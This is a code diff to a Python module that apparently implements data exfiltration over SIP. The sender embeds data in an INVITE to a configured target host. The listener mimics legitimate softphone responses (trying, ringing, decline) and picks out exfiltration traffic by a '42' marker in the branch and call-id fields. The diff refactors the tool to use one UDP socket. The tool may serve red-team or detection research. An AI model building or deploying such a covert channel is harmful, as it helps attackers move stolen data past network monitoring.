@@ -179,11 +179,10 @@ class SIPDialog:
 
 def listen():
     port = config['port']
-    lsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    ssock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    lsock.bind(('', port))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(('', port))
     while True:
-        data, addr = lsock.recvfrom(65535)
+        data, addr = sock.recvfrom(65535)
         try:
             req = sip.Request()
             req.unpack(data)
@@ -192,11 +191,11 @@ def listen():
                 dialog.init_from_request(req)
                 #Simulate legit softphone responses
                 trying = dialog.trying(req)
-                ssock.sendto(trying.pack(), (addr[0], int(dialog.uas.port)))
+                sock.sendto(trying.pack(), addr)
                 ringing = dialog.ringing(req)
-                ssock.sendto(ringing.pack(), (addr[0], int(dialog.uas.port)))
+                sock.sendto(ringing.pack(), addr)
                 decline = dialog.decline(req)
-                ssock.sendto(decline.pack(), (addr[0], int(dialog.uas.port)))
+                sock.sendto(decline.pack(), addr)
                 #Check if the request is part of exfiltration job
                 if dialog.branch[11:13] == "42" and dialog.call_id[3:5] == "42":
                     parser = re.compile('boundary=(.*)')
@@ -212,25 +211,23 @@ def listen():
 def send(data):
     target = config['target']
     port = config['port']
-    lsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    ssock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(('', port))
     dialog = SIPDialog()
     laddr = socket.gethostbyname(socket.getfqdn())
     uac = UserAgent(caller, laddr, port=port)
     uas = UserAgent(callee, target, port=port)
     invite = dialog.invite(uac, uas, data)
-    lsock.bind(('', port))
-    ssock.sendto(invite.pack(), (target, port))
+    sock.sendto(invite.pack(), (target, port))
     while True:
         try:
-            recv_data, addr = lsock.recvfrom(65535)
+            recv_data, addr = sock.recvfrom(65535)
             response = sip.Response()
             response.unpack(recv_data)
             if response.reason == 'Decline':
                 ack = dialog.ack(response)
-                ssock.sendto(ack.pack(), (target, port))
-                ssock.close()
-                lsock.close()
+                sock.sendto(ack.pack(), (target, port))
+                sock.close()
                 break
             else:
                 continue
